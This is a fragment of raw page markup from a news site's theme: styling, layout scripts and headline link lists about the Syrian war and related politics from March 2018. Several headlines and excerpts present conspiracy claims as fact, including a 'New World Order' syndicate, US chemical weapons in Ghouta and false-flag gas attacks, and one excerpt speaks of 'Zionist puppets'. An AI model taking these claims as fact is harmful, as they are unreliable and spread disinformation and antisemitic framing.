</div> </div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_60_5aaf778c30089" data-td_block_id="td_uid_60_5aaf778c30089"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_60_5aaf778c30089" data-td_block_id="td_uid_60_5aaf778c30089"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <div class="td_block_wrap td_block_15 td_uid_73_5aaf778c3375a_rand td_with_ajax_pagination td-pb-border-top td_block_template_1 td-column-2 td_block_padding" data-td-block-uid="td_uid_73_5aaf778c3375a">
<style>
body .td_uid_73_5aaf778c3375a_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_73_5aaf778c3375a_rand .td-pulldown-filter-link:hover,
            body .td_uid_73_5aaf778c3375a_rand .td-subcat-item a:hover,
            body .td_uid_73_5aaf778c3375a_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_73_5aaf778c3375a_rand .td_quote_on_blocks,
            body .td_uid_73_5aaf778c3375a_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_73_5aaf778c3375a_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_73_5aaf778c3375a_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_73_5aaf778c3375a_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_73_5aaf778c3375a_rand .td-next-prev-wrap a:hover,
            body .td_uid_73_5aaf778c3375a_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_73_5aaf778c3375a_rand .block-title > *,
            body .td_uid_73_5aaf778c3375a_rand .td-trending-now-title,
            body .td_uid_73_5aaf778c3375a_rand .td-read-more a,
            body .td_uid_73_5aaf778c3375a_rand .td-weather-information:before,
            body .td_uid_73_5aaf778c3375a_rand .td-weather-week:before,
            body .td_uid_73_5aaf778c3375a_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_73_5aaf778c3375a_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_73_5aaf778c3375a_rand .td-post-category,
            body .td_uid_73_5aaf778c3375a_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_73_5aaf778c3375a_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_73_5aaf778c3375a_rand .block-title {
                border-color: #990000;
            }
</style><script>var block_td_uid_73_5aaf778c3375a = new tdBlock();
block_td_uid_73_5aaf778c3375a.id = "td_uid_73_5aaf778c3375a";
block_td_uid_73_5aaf778c3375a.atts = '{"limit":"3","sort":"","post_ids":"","tag_slug":"","autors_id":"7","installed_post_types":"","category_id":"","category_ids":"","custom_title":"Gordon Duff\u0027s Top Secret Files","custom_url":"https:\/\/www.veteranstoday.com\/author\/gordonduff\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"#990000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":2,"td_ajax_preloading":"","td_ajax_filter_type":"td_popularity_filter_fa","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_73_5aaf778c3375a_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_73_5aaf778c3375a_rand","tdc_css_class_style":"td_uid_73_5aaf778c3375a_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_73_5aaf778c3375a.td_column_number = "2";
block_td_uid_73_5aaf778c3375a.block_type = "td_block_15";
block_td_uid_73_5aaf778c3375a.post_count = "3";
block_td_uid_73_5aaf778c3375a.found_posts = "1598";
block_td_uid_73_5aaf778c3375a.header_color = "#990000";
block_td_uid_73_5aaf778c3375a.ajax_pagination_infinite_stop = "";
block_td_uid_73_5aaf778c3375a.max_num_pages = "533";
tdBlocksArray.push(block_td_uid_73_5aaf778c3375a);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/author/gordonduff/" class="td-pulldown-size">Gordon Duff&#039;s Top Secret Files</a></h4><div class="td-pulldown-syle-default td-subcat-filter" id="td_pulldown_td_uid_73_5aaf778c3375a"><ul class="td-subcat-list" id="td_pulldown_td_uid_73_5aaf778c3375a_list"><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_74_5aaf778c342bb" data-td_filter_value="" data-td_block_id="td_uid_73_5aaf778c3375a" href="#">All</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_75_5aaf778c342f7" data-td_filter_value="featured" data-td_block_id="td_uid_73_5aaf778c3375a" href="#">Featured</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_76_5aaf778c3430e" data-td_filter_value="popular" data-td_block_id="td_uid_73_5aaf778c3375a" href="#">All time popular</a></li></ul><div class="td-subcat-dropdown"><div class="td-subcat-more" aria-haspopup="true"><span>More</span><i class="td-icon-read-down"></i></div><ul class="td-pulldown-filter-list"></ul></div></div></div><div id=td_uid_73_5aaf778c3375a class="td_block_inner td-column-2">
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/mayday-in-the-uk-or-casus-belli/" rel="bookmark" title="Mayday in the UK or Casus Belli?"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-507-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-507-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-507-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Mayday in the UK or Casus Belli?" /></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/corruption/" class="td-post-category">Corruption</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/mayday-in-the-uk-or-casus-belli/" rel="bookmark" title="Mayday in the UK or Casus Belli?">Mayday in the UK or Casus Belli?</a></h3>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/15/screw-you-trump-photos-of-us-chemical-weapons-facility-in-ghouta/" rel="bookmark" title="Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-506-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-506-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-506-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/15/screw-you-trump-photos-of-us-chemical-weapons-facility-in-ghouta/" rel="bookmark" title="Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta">Screw You Trump: Photos of US Chemical Weapons Facility in Ghouta</a></h3>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/14/intel-drop-a-ufo-visit-for-trump/" rel="bookmark" title="Intel Drop: A UFO Visit for Trump?"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-503-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-503-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-503-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Intel Drop: A UFO Visit for Trump?" /></a></div> <a href="https://www.veteranstoday.com/category/life/" class="td-post-category">Life</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/14/intel-drop-a-ufo-visit-for-trump/" rel="bookmark" title="Intel Drop: A UFO Visit for Trump?">Intel Drop: A UFO Visit for Trump?</a></h3>
</div>
</div> </div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_73_5aaf778c3375a" data-td_block_id="td_uid_73_5aaf778c3375a"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_73_5aaf778c3375a" data-td_block_id="td_uid_73_5aaf778c3375a"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <div class="clearfix"></div><div class="td_block_wrap td_block_1 td_uid_77_5aaf778c35a70_rand td_with_ajax_pagination td-pb-border-top td_block_template_1 td-column-2" data-td-block-uid="td_uid_77_5aaf778c35a70">
<style>
body .td_uid_77_5aaf778c35a70_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_77_5aaf778c35a70_rand .td-pulldown-filter-link:hover,
            body .td_uid_77_5aaf778c35a70_rand .td-subcat-item a:hover,
            body .td_uid_77_5aaf778c35a70_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_77_5aaf778c35a70_rand .td_quote_on_blocks,
            body .td_uid_77_5aaf778c35a70_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_77_5aaf778c35a70_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_77_5aaf778c35a70_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_77_5aaf778c35a70_rand .td-instagram-user a {
                color: #000000;
            }

            body .td_uid_77_5aaf778c35a70_rand .td-next-prev-wrap a:hover,
            body .td_uid_77_5aaf778c35a70_rand .td-load-more-wrap a:hover {
                background-color: #000000;
                border-color: #000000;
            }

            body .td_uid_77_5aaf778c35a70_rand .block-title > *,
            body .td_uid_77_5aaf778c35a70_rand .td-trending-now-title,
            body .td_uid_77_5aaf778c35a70_rand .td-read-more a,
            body .td_uid_77_5aaf778c35a70_rand .td-weather-information:before,
            body .td_uid_77_5aaf778c35a70_rand .td-weather-week:before,
            body .td_uid_77_5aaf778c35a70_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_77_5aaf778c35a70_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_77_5aaf778c35a70_rand .td-post-category,
            body .td_uid_77_5aaf778c35a70_rand .td-post-category:hover {
                background-color: #000000;
            }
            body .td-footer-wrapper .td_uid_77_5aaf778c35a70_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_77_5aaf778c35a70_rand .block-title {
                border-color: #000000;
            }
</style><script>var block_td_uid_77_5aaf778c35a70 = new tdBlock();
block_td_uid_77_5aaf778c35a70.id = "td_uid_77_5aaf778c35a70";
block_td_uid_77_5aaf778c35a70.atts = '{"limit":5,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"26685","category_ids":"","custom_title":"The Raging War in Syria","custom_url":"https:\/\/www.veteranstoday.com\/category\/wars\/syria-war\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"#000000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":2,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_77_5aaf778c35a70_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_77_5aaf778c35a70_rand","tdc_css_class_style":"td_uid_77_5aaf778c35a70_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_77_5aaf778c35a70.td_column_number = "2";
block_td_uid_77_5aaf778c35a70.block_type = "td_block_1";
block_td_uid_77_5aaf778c35a70.post_count = "5";
block_td_uid_77_5aaf778c35a70.found_posts = "150";
block_td_uid_77_5aaf778c35a70.header_color = "#000000";
block_td_uid_77_5aaf778c35a70.ajax_pagination_infinite_stop = "";
block_td_uid_77_5aaf778c35a70.max_num_pages = "30";
tdBlocksArray.push(block_td_uid_77_5aaf778c35a70);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/category/wars/syria-war/" class="td-pulldown-size">The Raging War in Syria</a></h4></div><div id=td_uid_77_5aaf778c35a70 class="td_block_inner">
<div class="td-block-row">
<div class="td-block-span6">
<div class="td_module_4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/new-world-order-criminal-syndicate-in-syria/" rel="bookmark" title="New World Order Criminal Syndicate in Syria"><img width="324" height="235" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/new4-324x235.jpg" alt="" title="New World Order Criminal Syndicate in Syria" /></a></div> <a href="https://www.veteranstoday.com/category/wars/syria-war/" class="td-post-category">War in Syria</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/new-world-order-criminal-syndicate-in-syria/" rel="bookmark" title="New World Order Criminal Syndicate in Syria">New World Order Criminal Syndicate in Syria</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/alexis/">Jonas E. Alexis</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T13:03:53+00:00">March 16, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/16/new-world-order-criminal-syndicate-in-syria/#comments">4</a></div> </div>
<div class="td-excerpt">
...by Jonas E. Alexis
If you don’t think that there is a criminal syndicate out there which vows to destroy the moral and political order,... </div>
</div>
</div> 
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/02/25/the-beatles/" rel="bookmark" title="Who are ISIS terrorists known as &#8220;The Beatles&#8221;?"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/Alexanda-Kotey-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/Alexanda-Kotey-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/02/Alexanda-Kotey-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Who are ISIS terrorists known as &#8220;The Beatles&#8221;?" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/25/the-beatles/" rel="bookmark" title="Who are ISIS terrorists known as &#8220;The Beatles&#8221;?">Who are ISIS terrorists known as &#8220;The Beatles&#8221;?</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-25T17:48:56+00:00">February 25, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/02/19/russia-to-us-so-you-want-to-play-with-fire-in-syria/" rel="bookmark" title="Russia to US: So, you want to “play with fire” in Syria?"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/fire-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/fire-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/02/fire-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Russia to US: So, you want to “play with fire” in Syria?" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/19/russia-to-us-so-you-want-to-play-with-fire-in-syria/" rel="bookmark" title="Russia to US: So, you want to “play with fire” in Syria?">Russia to US: So, you want to “play with fire” in...</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-19T08:39:00+00:00">February 19, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/02/10/syrian-forces-israeli-defense-forces-you-aint-seen-nothing-yet/" rel="bookmark" title="Syrian forces Israeli Defense Forces: you ain’t seen nothing yet"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/syria2-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/syria2-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/02/syria2-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Syrian forces Israeli Defense Forces: you ain’t seen nothing yet" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/10/syrian-forces-israeli-defense-forces-you-aint-seen-nothing-yet/" rel="bookmark" title="Syrian forces Israeli Defense Forces: you ain’t seen nothing yet">Syrian forces Israeli Defense Forces: you ain’t seen nothing yet</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-10T06:29:22+00:00">February 10, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/02/02/new-world-order-agents-lie-about-syria-again/" rel="bookmark" title="New World Order Agents Lie About Syria—Again"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/war4-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/war4-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/02/war4-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="New World Order Agents Lie About Syria—Again" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/02/new-world-order-agents-lie-about-syria-again/" rel="bookmark" title="New World Order Agents Lie About Syria—Again">New World Order Agents Lie About Syria—Again</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-02T18:34:08+00:00">February 2, 2018</time></span> </div>
</div>
</div>
</div> </div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_77_5aaf778c35a70" data-td_block_id="td_uid_77_5aaf778c35a70"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_77_5aaf778c35a70" data-td_block_id="td_uid_77_5aaf778c35a70"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <div class="td_block_wrap td_block_1 td_uid_78_5aaf778c39f0f_rand td_with_ajax_pagination td-pb-border-top td_block_template_1 td-column-2" data-td-block-uid="td_uid_78_5aaf778c39f0f">
<style>
body .td_uid_78_5aaf778c39f0f_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_78_5aaf778c39f0f_rand .td-pulldown-filter-link:hover,
            body .td_uid_78_5aaf778c39f0f_rand .td-subcat-item a:hover,
            body .td_uid_78_5aaf778c39f0f_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_78_5aaf778c39f0f_rand .td_quote_on_blocks,
            body .td_uid_78_5aaf778c39f0f_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_78_5aaf778c39f0f_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_78_5aaf778c39f0f_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_78_5aaf778c39f0f_rand .td-instagram-user a {
                color: #000000;
            }

            body .td_uid_78_5aaf778c39f0f_rand .td-next-prev-wrap a:hover,
            body .td_uid_78_5aaf778c39f0f_rand .td-load-more-wrap a:hover {
                background-color: #000000;
                border-color: #000000;
            }

            body .td_uid_78_5aaf778c39f0f_rand .block-title > *,
            body .td_uid_78_5aaf778c39f0f_rand .td-trending-now-title,
            body .td_uid_78_5aaf778c39f0f_rand .td-read-more a,
            body .td_uid_78_5aaf778c39f0f_rand .td-weather-information:before,
            body .td_uid_78_5aaf778c39f0f_rand .td-weather-week:before,
            body .td_uid_78_5aaf778c39f0f_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_78_5aaf778c39f0f_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_78_5aaf778c39f0f_rand .td-post-category,
            body .td_uid_78_5aaf778c39f0f_rand .td-post-category:hover {
                background-color: #000000;
            }
            body .td-footer-wrapper .td_uid_78_5aaf778c39f0f_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_78_5aaf778c39f0f_rand .block-title {
                border-color: #000000;
            }
</style><script>var block_td_uid_78_5aaf778c39f0f = new tdBlock();
block_td_uid_78_5aaf778c39f0f.id = "td_uid_78_5aaf778c39f0f";
block_td_uid_78_5aaf778c39f0f.atts = '{"limit":5,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"65","category_ids":"","custom_title":"WarZone","custom_url":"https:\/\/www.veteranstoday.com\/category\/wars\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"#000000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":2,"td_ajax_preloading":"","td_ajax_filter_type":"td_popularity_filter_fa","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_78_5aaf778c39f0f_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_78_5aaf778c39f0f_rand","tdc_css_class_style":"td_uid_78_5aaf778c39f0f_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_78_5aaf778c39f0f.td_column_number = "2";
block_td_uid_78_5aaf778c39f0f.block_type = "td_block_1";
block_td_uid_78_5aaf778c39f0f.post_count = "5";
block_td_uid_78_5aaf778c39f0f.found_posts = "2257";
block_td_uid_78_5aaf778c39f0f.header_color = "#000000";
block_td_uid_78_5aaf778c39f0f.ajax_pagination_infinite_stop = "";
block_td_uid_78_5aaf778c39f0f.max_num_pages = "452";
tdBlocksArray.push(block_td_uid_78_5aaf778c39f0f);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/category/wars/" class="td-pulldown-size">WarZone</a></h4><div class="td-pulldown-syle-default td-subcat-filter" id="td_pulldown_td_uid_78_5aaf778c39f0f"><ul class="td-subcat-list" id="td_pulldown_td_uid_78_5aaf778c39f0f_list"><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_79_5aaf778c3b0ab" data-td_filter_value="" data-td_block_id="td_uid_78_5aaf778c39f0f" href="#">All</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_80_5aaf778c3b0e7" data-td_filter_value="featured" data-td_block_id="td_uid_78_5aaf778c39f0f" href="#">Featured</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_81_5aaf778c3b121" data-td_filter_value="popular" data-td_block_id="td_uid_78_5aaf778c39f0f" href="#">All time popular</a></li></ul><div class="td-subcat-dropdown"><div class="td-subcat-more" aria-haspopup="true"><span>More</span><i class="td-icon-read-down"></i></div><ul class="td-pulldown-filter-list"></ul></div></div></div><div id=td_uid_78_5aaf778c39f0f class="td_block_inner">
<div class="td-block-row">
<div class="td-block-span6">
<div class="td_module_4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/russia-and-iran-vs-the-new-world-order/" rel="bookmark" title="Russia and Iran vs. The New World Order"><img width="324" height="235" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/iran2-324x235.jpg" alt="" title="Russia and Iran vs. The New World Order" /></a></div> <a href="https://www.veteranstoday.com/category/wars/new-world-order-war/" class="td-post-category">New World Order (NWO)</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/russia-and-iran-vs-the-new-world-order/" rel="bookmark" title="Russia and Iran vs. The New World Order">Russia and Iran vs. The New World Order</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/alexis/">Jonas E. Alexis</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T10:30:18+00:00">March 18, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/18/russia-and-iran-vs-the-new-world-order/#comments">2</a></div> </div>
<div class="td-excerpt">
...by Jonas E. Alexis
Peace is a frightening thing for New World Order agents, Neocon ideologues, and Zionist puppets. They freak out whenever they hear... </div>
</div>
</div> 
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/shifting-sands-in-a-post-daesh-mid-east/" rel="bookmark" title="NEO &#8211; Shifting Sands in a Post-Daesh Mid East"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Jim-W.-Dean-Syrian-Parliament-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Jim-W.-Dean-Syrian-Parliament-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Jim-W.-Dean-Syrian-Parliament-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="NEO &#8211; Shifting Sands in a Post-Daesh Mid East" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/shifting-sands-in-a-post-daesh-mid-east/" rel="bookmark" title="NEO &#8211; Shifting Sands in a Post-Daesh Mid East">NEO &#8211; Shifting Sands in a Post-Daesh Mid East</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-17T19:39:00+00:00">March 17, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/us-training-syria-militants-for-false-flag-chemical-attack-as-basis-for-airstrikes-russian-mod/" rel="bookmark" title="Defcon2, War Imminent: Russia to Retaliate Against Trump&#8217;s Gas Attacks, Carrier Strikes on Syria"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/feature-defcon2-1-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/feature-defcon2-1-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/feature-defcon2-1-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Defcon2, War Imminent: Russia to Retaliate Against Trump&#8217;s Gas Attacks, Carrier Strikes on Syria" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/us-training-syria-militants-for-false-flag-chemical-attack-as-basis-for-airstrikes-russian-mod/" rel="bookmark" title="Defcon2, War Imminent: Russia to Retaliate Against Trump&#8217;s Gas Attacks, Carrier Strikes on Syria">Defcon2, War Imminent: Russia to Retaliate Against Trump&#8217;s Gas Attacks, Carrier...</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-17T10:17:04+00:00">March 17, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/col-lawrence-wilkerson-israel-is-dragging-us-to-world-war-iii/" rel="bookmark" title="Col. Lawrence Wilkerson: Israel is dragging US to World War III"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/colonel-lawrence-wilkerson--100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/colonel-lawrence-wilkerson--100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/colonel-lawrence-wilkerson--218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Col. Lawrence Wilkerson: Israel is dragging US to World War III" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/col-lawrence-wilkerson-israel-is-dragging-us-to-world-war-iii/" rel="bookmark" title="Col. Lawrence Wilkerson: Israel is dragging US to World War III">Col. Lawrence Wilkerson: Israel is dragging US to World War III</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-17T00:04:16+00:00">March 17, 2018</time></span> </div>
</div>
</div>
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/trumped-syrian-army-evacuates-12500-civilians-from-eastern-ghouta/" rel="bookmark" title="Trumped:  Syrian Army Evacuates 12,500 Civilians from Eastern Ghouta"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-26-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-26-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-26-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Trumped:  Syrian Army Evacuates 12,500 Civilians from Eastern Ghouta" /><span class="td-video-play-ico td-video-small"><img width="20" height="20" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/video-small.png" alt="video" /></span></a></div>
<div class="item-details">
